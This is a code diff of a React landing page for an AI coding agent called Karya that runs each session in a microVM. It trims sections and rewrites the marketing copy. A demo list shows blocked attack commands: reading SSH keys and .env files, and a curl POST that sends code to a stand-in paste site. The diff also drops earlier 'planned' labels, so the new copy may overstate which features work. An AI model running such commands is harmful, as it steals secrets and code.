@@ -5,12 +5,9 @@ import Link from "next/link";
 import SiteNav from "./SiteNav";
 import SiteFooter from "./SiteFooter";
 import Terminal from "./Terminal";
-import ApprovalCard from "./ApprovalCard";
-import EnvTable from "./EnvTable";
 import Mark from "./Mark";
-import TuiFrame from "./TuiFrame";
 
-const INSTALL = "go install github.com/prateek041/karya/cmd/karya@latest";
+const INSTALL = "curl -fsSL https://usekarya.dev/install | sh";
 
 const SPLITS: Record<string, [string, string]> = {
   "Autonomy without the risk.": ["Autonomy without ", "the risk."],
@@ -20,7 +17,7 @@ const SPLITS: Record<string, [string, string]> = {
 };
 const BIG = ["its own computer", "nothing on your host", "reviewed before it lands", "your keys", "any model"];
 const CHAPTERS = ["task", "vm", "run", "fix", "review", "accept", "report"];
-const TICKER = ["a microVM per session", "nothing runs on your host", "repo copied in, .env left out", "python · read · shell · write_stdin · jobs", "terminal UI and desktop app", "every turn priced", "OpenAI-compatible providers", "a gate on every request out", "an oracle reviews every diff", "git checkpoint before apply", "Linux with KVM · macOS on Apple silicon", "single Go binary", "open source", "pre-1.0"];
+const TICKER = ["a microVM per session", "nothing runs on your host", "repo copied in, .env left out", "python · read · shell · write_stdin · jobs", "terminal UI and desktop app", "every turn priced", "OpenAI-compatible providers", "a gate on every request out", "an oracle reviews every diff", "git checkpoint before apply", "Linux with KVM · macOS on Apple silicon", "open source", "pre-1.0"];
 const NODES: [string, string, boolean?][] = [
   ["task", "you", true],
   ["model", "picks a tool"],
@@ -33,7 +30,7 @@ const NODES: [string, string, boolean?][] = [
 const SEQ = [
   { n: 0, it: 1, ms: 2000, c: 0, cap: "you: fix the failing test in internal/meter and make go test pass" },
   { n: 1, it: 1, ms: 1400, c: 0.0034, cap: "model plans and calls shell: go test ./internal/meter" },
-  { n: 2, it: 1, ms: 1600, c: 0.0034, cap: "microVM: the test runs on the copy in /workspace · exit 1" },
+  { n: 2, it: 1, ms: 1600, c: 0.0034, cap: "microVM: the test runs on the copy in the workspace inside the VM · exit 1" },
   { n: 3, it: 1, ms: 1200, c: 0.0034, cap: "result: the failure goes back to the model" },
   { n: 1, it: 2, ms: 1300, c: 0.0095, cap: "model fixes sum.go and reruns the tests" },
   { n: 2, it: 2, ms: 1600, c: 0.0095, cap: "microVM: go test ./... · exit 0" },
@@ -51,49 +48,21 @@ const ROWS: [string, string, string, string, "d" | "p" | "w"][] = [
   ["proc", "processes", "  shells, Python, servers", "kept running", "p"],
   ["net", "⇢ network", "  through the gate", "checked", "d"],
 ];
-const TOOLS: [string, string, boolean, string, string][] = [
-  ["shell · write_stdin", "in the VM", false, "Runs a command in the VM. A command still running after a short wait comes back with a process id; write_stdin reads its output or types into it.", `shell go test ./...
-exit 0 · 3.8s
-ok  github.com/acme/billing/internal/meter`],
-  ["python", "in the VM", false, "A Python session that keeps its state between calls, so the agent loads data once and keeps working with it.", `python df = pd.read_csv("usage.csv")
-       df.units.describe()
-count  18,204  mean 412.6  max 96,310`],
-  ["read · jobs", "in the VM", false, "read for bounded, directed file reads. jobs lists the processes that shell left running.", `jobs
-p3  npm run dev     running  2m10s
-p4  go test -run    exited 0`],
-  ["edit · write", "next", true, "Exact string edits and new files, made in the VM's copy. They reach your repo only through review.", `edit internal/meter/sum.go
-error ambiguous_match  old_text found 2 times
-file left untouched`],
-];
-const ASKS: [string, string, boolean][] = [
-  ["run commands, install packages", "runs in the VM", false],
-  ["read the web and package registries", "passes the gate if it carries nothing from your repo", false],
-  ["send data somewhere new", "asks you", true],
-  ["bring in more files or another repo", "asks you", true],
-  ["use a real secret", "asks you", true],
-  ["apply changes to your repo", "asks you, after review", true],
-];
 const PATHS: { name: string; tag: string; us?: boolean; rows: string[] }[] = [
   { name: "runs on your host", tag: "the yolo agent", rows: ["your machine", "your whole machine", "wherever the agent runs", "as soon as they're written", "the vendor's"] },
   { name: "asks for everything", tag: "the cautious agent", rows: ["your machine, once you press y", "your whole machine", "wherever the agent runs", "one prompt at a time", "the vendor's"] },
-  { name: "runs in their cloud", tag: "the hosted computer", rows: ["someone else's servers", "their VM, away from your repo", "on their servers", "copied back by hand", "one vendor's"] },
-  { name: "kārya", tag: "a computer of its own", us: true, rows: ["a microVM on your machine", "only the VM", "never inside the VM", "after review, with a checkpoint", "any provider, your keys"] },
+  { name: "runs in their cloud", tag: "the hosted computer", rows: ["their servers only", "their VM, away from your repo", "on their servers", "as a pull request you review", "their choice of models"] },
+  { name: "kārya", tag: "a computer of its own", us: true, rows: ["a microVM, local first", "only the VM", "never inside the VM", "after review, with a checkpoint", "any provider, your keys"] },
 ];
 const PATH_ROWS = ["where commands run", "what a bad command can reach", "your API keys", "changes reach your repo", "models"];
-const PROVIDERS: [string, boolean][] = [["OpenAI", true], ["Amazon Bedrock", true], ["any OpenAI-compatible API", true], ["Gemini", false], ["Anthropic", false]];
-const FAQ: [string, string][] = [
-  ["Is Karya free?", "Yes. Karya is open source and you bring your own API keys, so you pay your model provider directly. There is no markup on tokens and no Karya account."],
-  ["Which models can I use?", "OpenAI-compatible APIs work today, including OpenAI and Amazon Bedrock, which serves the default model, gpt-oss-120b. Gemini and Anthropic are planned."],
-  ["Can I use my Claude or ChatGPT subscription?", "No. Karya uses API keys only. Consumer subscriptions are not resold or proxied."],
-  ["What does the agent run on?", "A microVM per session, on your machine. Your repo is copied in without .env or key files, and nothing the agent runs touches your host."],
-  ["Where does my code go?", "Into the session's VM on your machine, and to the model provider you choose as part of the conversation. Nothing else."],
-  ["Which platforms are supported?", "Linux with KVM, and macOS on Apple silicon. Karya installs the microVM runtime the first time it starts. Native Windows is not planned for now."],
-  ["Is there a desktop app?", "Yes, an early one: a Tauri app that drives the same Karya core as the terminal UI, with the same chat, tool calls, commands and usage."],
-  ["Can I use it today?", "Yes, built from source: the terminal UI, the desktop app, the microVM and the shell, python and read tools work. Edits, review, the gate and saved sessions come next; the roadmap shows where each piece is."],
+const PROVIDERS: [string, string][] = [
+  ["openai", "OpenAI"], ["anthropic", "Anthropic"], ["gemini", "Google Gemini"], ["bedrock", "Amazon Bedrock"], ["azure", "Azure OpenAI"], ["vertexai", "Vertex AI"],
+  ["mistral", "Mistral"], ["deepseek", "DeepSeek"], ["xai", "xAI"], ["groq", "Groq"], ["openrouter", "OpenRouter"], ["together", "Together AI"],
+  ["fireworks", "Fireworks AI"], ["huggingface", "Hugging Face"], ["qwen", "Qwen"], ["ollama", "Ollama"],
 ];
 type Attempt = { cmd: string; res: string; ok: boolean; rows: string[] };
 const ATTEMPTS: Attempt[] = [
-  { cmd: "$ go test ./...", res: "✓ ran in the VM · writes stay in /workspace", ok: true, rows: ["ws"] },
+  { cmd: "$ go test ./...", res: "✓ ran in the VM · writes stay in the workspace inside the VM", ok: true, rows: ["ws"] },
   { cmd: "$ cat ~/.ssh/id_ed25519", res: "✕ not found · the VM has no host folders", ok: false, rows: ["ssh"] },
   { cmd: "$ cat .env", res: "✕ not found · secret files are left out", ok: false, rows: ["env"] },
   { cmd: "$ curl -X POST paste.example -d @internal", res: "✕ blocked · it carries your code to an unknown site", ok: false, rows: ["net"] },
@@ -109,10 +78,6 @@ const lead = "font-serif text-[19px] leading-[1.6] text-pretty text-fg-2 mobile:
 const sectionPad = "mx-auto my-0 max-w-[1100px] px-6 py-[clamp(72px,10vw,128px)] mobile:px-5 mobile:py-14";
 const split2 = "grid grid-cols-[repeat(auto-fit,minmax(min(100%,380px),1fr))] items-start gap-x-16 gap-y-12";
 const em = "text-accent";
-const toolPre = "m-0 mt-auto overflow-hidden bg-bg-2 px-3 py-[10px] font-mono text-[12.5px] leading-[1.55] whitespace-pre-wrap [word-break:break-word] text-fg-2";
-const toolCard = "flex flex-col gap-[14px] bg-bg p-[clamp(24px,3vw,40px)] [transition:background_.2s] hover:bg-bg-2 mobile:p-5";
-const toolHead = "flex items-center justify-between font-mono";
-const toolDesc = "font-serif text-[17px] leading-[1.5] text-fg-2";
 const pill = "border border-line-2 px-[9px] py-[3px] text-fg-2";
 const th = "px-4 py-3 font-normal";
 const thFirst = "pt-3 pr-4 pb-3 pl-0 font-normal";
@@ -134,8 +99,6 @@ export interface LandingProps {
 }
 
 interface State {
-  gateKey: string | null;
-  gatePress: string | null;
   copied: boolean;
   typed: number;
   cur: boolean;
@@ -148,11 +111,10 @@ interface State {
 }
 
 export default class Landing extends React.Component<LandingProps, State> {
-  state: State = { gateKey: null, gatePress: null, copied: false, typed: 0, cur: true, chapter: -1, loopI: 0, sbLines: [], sbActive: null, ledger: 0, costT: 0 };
+  state: State = { copied: false, typed: 0, cur: true, chapter: -1, loopI: 0, sbLines: [], sbActive: null, ledger: 0, costT: 0 };
   rootRef = React.createRef<HTMLDivElement>();
   marqueeRef = React.createRef<HTMLDivElement>();
   marquee2Ref = React.createRef<HTMLDivElement>();
-  gateRef = React.createRef<HTMLDivElement>();
   timers: ReturnType<typeof setTimeout>[] = [];
   alive = false;
   reduced = false;
@@ -162,7 +124,6 @@ export default class Landing extends React.Component<LandingProps, State> {
   io: IntersectionObserver | undefined;
   io2: IntersectionObserver | undefined;
   ct: ReturnType<typeof setTimeout> | undefined;
-  kh: ((e: KeyboardEvent) => void) | undefined;
 
   t(fn: () => void, ms: number) {
     this.timers.push(setTimeout(() => this.alive && fn(), ms));
@@ -176,17 +137,6 @@ export default class Landing extends React.Component<LandingProps, State> {
   }
   componentDidMount() {
     this.alive = true;
-    this.kh = (e) => {
-      const tg = e.target && (e.target as HTMLElement).tagName;
-      if (tg === "INPUT" || tg === "TEXTAREA" || e.metaKey || e.ctrlKey) return;
-      const k = (e.key || "").toLowerCase();
-      const g = this.gateRef.current;
-      if ((k === "a" || k === "d") && g) {
-        const r = g.getBoundingClientRect();
-        if (r.bottom > 80 && r.top < window.innerHeight - 80) this.pressGate(k);
-      }
-    };
-    window.addEventListener("keydown", this.kh);
     this.reduced = !!(typeof window.matchMedia === "function" && matchMedia("(prefers-reduced-motion: reduce)").matches);
     this.blink = setInterval(() => this.alive && this.setState((s) => ({ cur: !s.cur })), 530);
     if (this.reduced) {
@@ -213,7 +163,6 @@ export default class Landing extends React.Component<LandingProps, State> {
     clearInterval(this.blink);
     cancelAnimationFrame(this.raf);
     cancelAnimationFrame(this.raf2);
-    if (this.kh) window.removeEventListener("keydown", this.kh);
     this.io && this.io.disconnect();
     this.io2 && this.io2.disconnect();
     clearTimeout(this.ct);
@@ -278,10 +227,6 @@ export default class Landing extends React.Component<LandingProps, State> {
     };
     this.raf2 = requestAnimationFrame(f);
   }
-  pressGate = (k: string) => {
-    this.setState({ gateKey: k, gatePress: k });
-    this.t(() => this.setState({ gatePress: null }), 150);
-  };
   reveal() {
     const root = this.rootRef.current;
     if (!root || !window.IntersectionObserver) {
@@ -366,8 +311,6 @@ export default class Landing extends React.Component<LandingProps, State> {
     const ticker = [...TICKER, ...TICKER];
     // alternate filled italic words with outlined upright ones
     const bigTicker = [...BIG, ...BIG].map((text, i) => ({ text, cls: i % 2 ? "text-bg [-webkit-text-stroke:3px_var(--fg-2)] [paint-order:stroke_fill] not-italic" : "text-fg [-webkit-text-stroke:0] italic" }));
-    const gp = this.state.gatePress;
-    const gateMsg = this.state.gateKey === "a" ? "✓ accepted · checkpoint 3f9a1c taken · diff applied" : this.state.gateKey === "d" ? "✕ declined · your repo is untouched · the fix stays in the VM" : "› waiting on you · [a]ccept [d]ecline";
     const rowOp = (k: number) => (lg >= k ? "opacity-100" : "opacity-10");
 
     return (
@@ -454,7 +397,7 @@ export default class Landing extends React.Component<LandingProps, State> {
             <h2 data-reveal className={`${h2} ${h2m} max-w-[18ch]`}>
               Babysit it, or <em className={em}>hope for the best.</em>
             </h2>
-            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Agents either run on your machine, one bad command away from damage, or ask so often that nobody reads the prompts. The ones with a computer of their own run in someone else's cloud, on one vendor's models, away from your repo. Karya gives the agent its own computer on your machine, and makes everything that leaves it pass a check.</p>
+            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Agents either run on your machine, one bad command away from damage, or ask so often that nobody reads the prompts. The ones with a computer of their own live only in a vendor's cloud, on the models they pick, with your keys on their servers. Karya gives the agent its own computer, on your machine first and soon in our cloud too, and makes everything that leaves it pass a check.</p>
             <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,240px),1fr))] gap-4">
               {PATHS.map((pth) => (
                 <div key={pth.name} data-reveal className={`flex flex-col border ${pth.us ? "border-accent bg-bg-2" : "border-line-2 bg-transparent"}`}>
@@ -477,30 +420,13 @@ export default class Landing extends React.Component<LandingProps, State> {
           </div>
         </section>
 
-        {/* numbers */}
-        <section className="border-b border-line">
-          <div className="mx-auto my-0 grid max-w-[1100px] grid-cols-[repeat(auto-fit,minmax(200px,1fr))] gap-x-7 gap-y-12 px-6 py-[clamp(56px,8vw,104px)] mobile:grid-cols-[repeat(2,minmax(0,1fr))] mobile:gap-x-5 mobile:gap-y-8 mobile:px-5 mobile:py-12">
-            {[
-              ["1", "microVM per session · started with it, thrown away after", false],
-              ["0", "agent commands run on your host", false],
-              ["5", "tools today · python, read, shell, write_stdin, jobs", false],
-              ["2", "clients · terminal UI and desktop app", true],
-            ].map(([num, cap, accent], i) => (
-              <div key={i} data-reveal className="flex flex-col gap-[14px]">
-                <div className={`font-serif text-[clamp(88px,11vw,148px)] leading-[0.85] tracking-[-0.05em] mobile:text-[64px] ${accent ? "text-accent" : ""}`}>{num as string}</div>
-                <div className="border-t border-line-2 pt-3 font-mono text-[13px] text-fg-2">{cap as string}</div>
-              </div>
-            ))}
-          </div>
-        </section>
-
         {/* pillars index */}
         <section className="border-t border-line">
           <div className="mx-auto my-0 grid max-w-[1100px] grid-cols-[repeat(auto-fit,minmax(180px,1fr))] gap-x-7 gap-y-8 px-6 py-12 mobile:gap-x-5 mobile:gap-y-[22px] mobile:px-5 mobile:py-9">
             {[
               ["#vm", "01", "A computer of its own", "Every command runs in the session's microVM, never on your machine."],
               ["#review", "02", "Reviewed before it lands", "Diffs are reviewed, then applied only when you accept."],
-              ["#cost", "03", "Cost you can see", "Every turn is priced. Hard limits come next."],
+              ["#cost", "03", "Cost you can see", "Every turn is priced."],
               ["#secrets", "04", "Your keys stay out", "The VM holds placeholders. A gate checks every request out."],
               ["#models", "05", "Any model, your keys", "OpenAI-compatible today, more providers next."],
             ].map(([href, num, title, sub]) => (
@@ -555,7 +481,6 @@ export default class Landing extends React.Component<LandingProps, State> {
                 <span>{step.cap}</span>
               </div>
             </div>
-            <div className="mt-4 font-mono text-[12.5px] text-fg-3">↺ model → microVM → result repeats until the model answers · review, brief and accept are planned</div>
             <div className="mt-9 flex flex-wrap items-center gap-[10px] border-t border-line pt-5 font-mono text-[12.5px]">
               <span className="mr-2 text-fg-3">you are asked only for</span>
               <span className={pill}>more files or repos</span>
@@ -576,119 +501,51 @@ export default class Landing extends React.Component<LandingProps, State> {
           </div>
         </section>
 
-        {/* approval gate */}
-        <section id="gate" className="bg-accent text-accent-ink">
-          <div ref={this.gateRef} className="mx-auto my-0 grid max-w-[1200px] grid-cols-[repeat(auto-fit,minmax(min(100%,440px),1fr))] items-center gap-x-16 gap-y-14 px-6 py-[clamp(80px,11vw,152px)] mobile:gap-10 mobile:px-5 mobile:py-16">
-            <div>
-              <div className="font-mono text-[13px]">the one prompt that matters</div>
-              <h2 className="mt-5 mb-7 max-w-[11ch] font-serif text-[clamp(48px,7.4vw,108px)] leading-[0.95] font-normal tracking-[-0.04em] mobile:text-[44px]">
-                Your repo changes when you press <em>a</em>.
-              </h2>
-              <p className="m-0 max-w-[42ch] font-serif text-[21px] leading-[1.5] text-pretty mobile:text-[18px]">The agent works on a copy of your repo inside its VM. Until you accept, git status on your machine shows nothing changed. Then Karya takes a git checkpoint and applies the diff. Try it: press a or d on your keyboard, or click a key.</p>
-            </div>
-            <div className="flex flex-col items-start gap-9">
-              <div className="flex flex-wrap gap-7">
-                {(["a", "d"] as const).map((k) => (
-                  <button
-                    key={k}
-                    onClick={() => this.pressGate(k)}
-                    aria-label={k === "a" ? "accept" : "decline"}
-                    className={`flex h-[clamp(128px,14vw,176px)] w-[clamp(128px,14vw,176px)] cursor-pointer flex-col items-start justify-between border-2 border-accent-ink bg-transparent px-[18px] py-4 text-left text-accent-ink [transition:transform_.09s,box-shadow_.09s] hover:bg-accent-ink hover:text-accent ${
-                      gp === k ? "[box-shadow:0_0px_0_var(--accent-ink)] [transform:translateY(10px)]" : "[box-shadow:0_10px_0_var(--accent-ink)] [transform:translateY(0px)]"
-                    }`}
-                  >
-                    <span className="font-mono text-[clamp(56px,6vw,80px)] leading-none font-medium">{k}</span>
-                    <span className="font-mono text-[13px]">{k === "a" ? "accept" : "decline"}</span>
-                  </button>
-                ))}
-              </div>
-              <div className="box-border flex w-full flex-col gap-1 border-2 border-accent-ink px-4 py-[14px] font-mono text-[14px] leading-[1.6]">
-                <span>proposal internal/meter/sum.go · +1 −1 · oracle passed</span>
-                <span className="font-semibold">{gateMsg}</span>
-              </div>
-            </div>
-          </div>
-        </section>
-
         {/* real clients */}
         <section id="today" className="border-t border-line">
           <div className={sectionPad}>
-            <div data-reveal className={label}>try it today</div>
-            <h2 data-reveal className={`${h2} ${h2m} max-w-[18ch]`}>
-              Terminal or desktop. <em className={em}>Same core.</em>
-            </h2>
-            <p data-reveal className={`${lead} mt-0 mb-7 max-w-[62ch]`}>The terminal UI and an early desktop app both drive the same Karya core. Each session already gets its own microVM with your repo copied in, minus .env and key files, and every turn shows its tokens and cost. Edits, review and the gate come next.</p>
-            <pre data-reveal className="mt-0 mb-4 inline-block max-w-full overflow-x-auto border border-accent bg-bg-2 px-[18px] py-3 font-mono text-[14px] leading-[1.8] mobile:text-[12.5px] mobile:whitespace-pre-wrap mobile:[overflow-wrap:break-word]">
-              <span className="text-accent">$</span> {INSTALL.split("/").map((part, k) => (k ? <React.Fragment key={k}>/<wbr />{part}</React.Fragment> : part))}{"\n"}
-              <span className="text-accent">$</span> karya
-            </pre>
-            <p data-reveal className="mt-0 mb-10 font-mono text-[12.5px] text-fg-3">needs Linux with KVM or macOS on Apple silicon, and an OpenAI or Amazon Bedrock key</p>
-            <div data-reveal>
-              <TuiFrame />
-            </div>
-          </div>
-        </section>
-
-        {/* anatomy */}
-        <section id="anatomy" className="border-t border-line">
-          <div className={sectionPad}>
-            <div data-reveal className={label}>anatomy of a harness</div>
-            <h2 data-reveal className={`${h2} mt-[18px] mb-12 max-w-[22ch]`}>The model is not limited. The place it works in is made safe.</h2>
-            <div className="grid grid-cols-[repeat(auto-fit,minmax(220px,1fr))] gap-x-8 gap-y-9">
-              {[
-                ["drives the model and tools", "Streams the model's reply, runs its tool calls one at a time, and prices every turn."],
-                ["owns the computer", "A microVM per session: the repo copied in, a Python session, and shells and servers that keep running between calls."],
-                ["controls every crossing", "Network traffic leaves through the gate, outputs come back through review, and real keys are added only on the way to their host."],
-                ["shows everything", "Every action the agent takes is one line you can read. Done means the checks passed, not that the model said so."],
-              ].map(([t, d]) => (
-                <div key={t} data-reveal className="flex flex-col gap-3 border-t border-fg-3 pt-[18px]">
-                  <div className="font-mono text-[13px]">{t}</div>
-                  <div className="font-serif text-[17px] leading-[1.5] text-fg-2">{d}</div>
-                </div>
-              ))}
-            </div>
-          </div>
-        </section>
-
-        {/* tools */}
-        <section id="tools" className="border-t border-line">
-          <div className={sectionPad}>
-            <div data-reveal className={label}>tools</div>
+            <div data-reveal className={label}>where it runs</div>
             <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>
-              A real computer, <em className={em}>not a cut-down tool list.</em>
+              Terminal and desktop. <em className={em}>Cloud next.</em>
             </h2>
-            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Nothing is taken away from the model to make it safe. It can install packages, run servers, analyse data and write code, because all of it happens inside the VM. These are the tools it has today, and the next ones.</p>
-            <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,420px),1fr))] gap-px border border-line bg-line">
-              {TOOLS.map(([name, badge, next, d, ex]) => (
-                <div key={name} data-reveal className={toolCard}>
-                  <div className={toolHead}>
-                    <span className="text-[30px] font-medium mobile:text-[24px]">{name}</span>
-                    <span className={`border px-2 py-[2px] text-[12px] ${next ? "border-accent text-accent" : "border-line-2 text-fg-2"}`}>{badge}</span>
+            <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,300px),1fr))] gap-px border border-line bg-line">
+              {[
+                ["Terminal", "in development", "The full Karya UI in any shell, editor or remote server.", INSTALL, "macOS · Apple silicon\nLinux · with KVM"],
+                ["Desktop", "early preview", "The same core in a native window, with the same chat, tools and usage.", "", "beta builds · expect rough edges"],
+                ["Cloud", "coming soon", "The same microVM, review and gate, running on our servers instead of your machine.", "", "no hardware needed"],
+              ].map(([t, status, d, cmd, plat], i) => (
+                <div key={t} data-reveal className="flex min-w-0 flex-col gap-3 bg-bg px-[22px] py-6">
+                  <div className="flex items-baseline justify-between gap-3">
+                    <div className="font-serif text-[26px] leading-[1.2]">{t}</div>
+                    <div className={`flex items-center gap-2 font-mono text-[12px] ${i === 0 ? "text-accent" : "text-fg-3"}`}>
+                      {i === 0 ? (
+                        <span className="relative inline-flex h-2 w-2">
+                          <span className="absolute inline-flex h-full w-full rounded-full bg-[#e8b839] opacity-75 motion-safe:animate-ping" />
+                          <span className="relative inline-flex h-2 w-2 rounded-full bg-[#e8b839]" />
+                        </span>
+                      ) : null}
+                      {status}
+                    </div>
                   </div>
-                  <div className={toolDesc}>{d}</div>
-                  <pre className={toolPre}>{ex}</pre>
+                  <div className="font-serif text-[16px] leading-[1.5] text-fg-2">{d}</div>
+                  {cmd ? (
+                    <pre className="m-0 overflow-x-auto border border-accent bg-bg-2 px-3 py-2 font-mono text-[12.5px] leading-[1.6] whitespace-pre">
+                      <span className="text-accent">$</span> {cmd}
+                    </pre>
+                  ) : null}
+                  {t === "Desktop" ? (
+                    <div className="flex flex-wrap gap-2">
+                      {["macOS", "Linux"].map((os) => (
+                        <button key={os} type="button" disabled title="coming soon" className="inline-flex cursor-not-allowed items-center gap-2 border border-line-2 bg-bg-2 px-3 py-2 font-mono text-[12.5px] text-fg-3 opacity-70">
+                          <span>↓</span> Download beta · {os}
+                        </button>
+                      ))}
+                    </div>
+                  ) : null}
+                  <div className="mt-auto pt-2 font-mono text-[12px] leading-[1.7] whitespace-pre-line text-fg-3">{plat}</div>
                 </div>
               ))}
             </div>
-            <div data-reveal className="mt-14 overflow-x-auto border-t border-fg-3">
-              <table className="w-full border-collapse text-left font-mono text-[13px] whitespace-nowrap">
-                <thead>
-                  <tr className="text-fg-3">
-                    <th className={thFirst}>when the agent wants to</th>
-                    <th className={thLast}>what happens</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {ASKS.map(([what, how, asks]) => (
-                    <tr key={what} className="border-t border-line">
-                      <td className={`${tdFirst} font-medium`}>{what}</td>
-                      <td className={`${tdLast} ${asks ? "text-accent" : "text-fg-2"}`}>{how}</td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
-            </div>
-            <div className="mt-4 font-mono text-[12.5px] text-fg-3">YOLO mode turns the prompts off; the VM and the gate stay · approvals are planned</div>
           </div>
         </section>
 
@@ -700,18 +557,13 @@ export default class Landing extends React.Component<LandingProps, State> {
               <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
                 Its own computer. <em className={em}>Not yours.</em>
               </h2>
-              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>Every session starts a microVM and copies your repo into /workspace, leaving out .env and key files. The agent can install what it needs, keep a Python session alive and leave servers running. None of it touches your machine: nothing it runs can reach your home directory, your SSH keys or your other projects.</p>
+              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>Every session starts a microVM and copies your repo into the workspace inside the VM, leaving out sensitive files. The agent can install what it needs, keep a Python session alive and leave servers running. None of it touches your machine.</p>
               <p data-reveal className={`${lead} mt-0 mb-7 max-w-[52ch]`}>There are no live shared folders. More files or another repo come in only when you approve.</p>
-              <div className="max-w-[52ch] border border-line-2 px-4 py-[14px]">
-                <div className="mb-[6px] font-mono text-[12.5px] text-fg-3">today</div>
-                <div className="font-serif text-[17px] leading-[1.5] text-fg">The microVM, the repo copy and the shell, python and read tools work now. The network gate in this panel is planned.</div>
-              </div>
             </div>
             <div data-reveal className="flex min-w-0 flex-col gap-3 font-mono text-[12.5px] leading-[1.7]">
               <div className="border border-line-2 bg-term">
                 <div className="flex flex-wrap justify-between gap-x-4 gap-y-1 border-b border-line px-[14px] py-2 text-fg-3">
                   <span>microVM · session 7f3a2c</span>
-                  <span>demo</span>
                 </div>
                 <div className="overflow-x-auto overflow-y-hidden px-[14px] py-3">
                   {ROWS.map(([id, path, note, status, kind]) => {
@@ -745,12 +597,12 @@ export default class Landing extends React.Component<LandingProps, State> {
         <section id="review" className="border-t border-line">
           <div className={`${sectionPad} ${split2}`}>
             <div>
-              <div data-reveal className={label}>02 · reviewed before it lands · planned</div>
+              <div data-reveal className={label}>02 · reviewed before it lands</div>
               <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
                 Nothing lands <em className={em}>unreviewed.</em>
               </h2>
-              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>The agent never writes to your repo. Its work comes back as a proposal: the diff against your repo, plus the docs and charts it made. An oracle, a second agent, reviews it first, and a diff that deletes a test instead of fixing it goes back to the coding agent.</p>
-              <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>You get a brief and decide: accept, decline, edit or suggest. Accepting takes a git checkpoint, then applies the diff. Commits happen only when you ask for them.</p>
+              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>The agent never writes to your repo. Its work comes back as a proposal: the diff against your repo, plus the docs and charts it made. An oracle, a second agent, reviews it first, and the coding agent and the oracle keep working on it together until they both agree on the solution.</p>
+              <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Only then does it reach you: one final change, already agreed on, waiting for your approval.</p>
             </div>
             <pre data-reveal className="m-0 min-w-0 overflow-x-auto border border-line-2 bg-term px-4 py-[14px] font-mono text-[13px] leading-[1.75] text-fg-2">
               <span className="text-fg-3">brief · proposal 2 · session 7f3a2c{"\n"}</span>
@@ -775,7 +627,7 @@ export default class Landing extends React.Component<LandingProps, State> {
                 <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
                   Every turn, <em className={em}>priced.</em>
                 </h2>
-                <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Each turn shows its tokens and cost today, priced from a snapshot that ships inside Karya. Next: limits on steps, tokens, cost and time that stop the turn and say which one fired, and loop detection that pauses after the same call or failure three times.</p>
+                <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Each turn shows its tokens and cost.</p>
               </div>
               <div className="flex flex-col gap-[6px]">
                 <div className="font-serif text-[clamp(64px,9.5vw,150px)] leading-[0.9] font-normal tracking-[-0.04em] whitespace-nowrap tabular-nums mobile:text-[56px]">{this.state.costT >= 1 ? "$0.02" : "$" + (0.02 * e).toFixed(4)}</div>
@@ -834,15 +686,13 @@ export default class Landing extends React.Component<LandingProps, State> {
                 </tbody>
               </table>
             </div>
-            <pre className="mt-8 mb-0 overflow-x-auto border border-line-2 px-4 py-3 font-mono text-[13px] leading-[1.7] text-fg-2">{`stopped  max cost reached ($1.00) · planned
-the turn says which limit fired and the session stays open`}</pre>
           </div>
         </section>
 
         {/* 04 secrets */}
         <section id="secrets" className="border-t border-line">
           <div className={sectionPad}>
-            <div data-reveal className={label}>04 · your keys stay out · planned</div>
+            <div data-reveal className={label}>04 · your keys stay out</div>
             <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>
               Real keys never <em className={em}>enter the VM.</em>
             </h2>
@@ -879,71 +729,18 @@ the turn says which limit fired and the session stays open`}</pre>
         <section id="models" className="border-t border-line">
           <div className={`${sectionPad} ${split2}`}>
             <div>
-              <div data-reveal className={label}>05 · any model, your keys</div>
+              <div data-reveal className={label}>05 · any model, your keys and your subscriptions</div>
               <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
                 Bring your <em className={em}>own model.</em>
               </h2>
-              <p data-reveal className={`${lead} mt-0 mb-4 max-w-[52ch]`}>Karya talks to providers through one interface, with API keys you own, so you pay the provider directly. OpenAI-compatible APIs work today, including OpenAI and Amazon Bedrock, which serves the default model, gpt-oss-120b. Gemini and Anthropic are next.</p>
-              <div data-reveal className="mt-0 mb-5 flex flex-wrap gap-2 font-mono text-[12.5px]">
-                {PROVIDERS.map(([n, live]) => (
-                  <span key={n} className={`border px-[10px] py-1 ${live ? "border-ok text-ok" : "border-line-2 text-fg-2"}`}>
-                    {live ? "● " : ""}
-                    {n}
-                  </span>
-                ))}
-                <span className="px-0 py-1 text-fg-3">● works today · others planned</span>
-              </div>
-              <pre className="m-0 overflow-x-auto border border-line bg-bg-2 px-4 py-[14px] font-mono text-[13px] leading-[1.7]">
-                <span className="text-fg-3">$</span> export OPENAI_API_KEY=…{"\n"}
-                <span className="text-fg-3">$</span> karya -model openai/gpt-4.1-nano
-              </pre>
+              <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Use the API keys and subscriptions you already have. Karya works with any OpenAI-compatible provider, from the big labs to a model running on your own machine. You pay the provider directly, and Karya adds nothing on top.</p>
             </div>
-            <EnvTable />
-          </div>
-        </section>
-
-        {/* faq */}
-        <section id="faq" className="border-t border-line">
-          <div className={`${sectionPad} flex flex-wrap items-start gap-x-16 gap-y-8`}>
-            <div className="flex-[1_1_280px]">
-              <div data-reveal className={label}>questions</div>
-              <h2 data-reveal className={`${h2} ${h2m} max-w-[12ch]`}>
-                Before you <em className={em}>install.</em>
-              </h2>
-            </div>
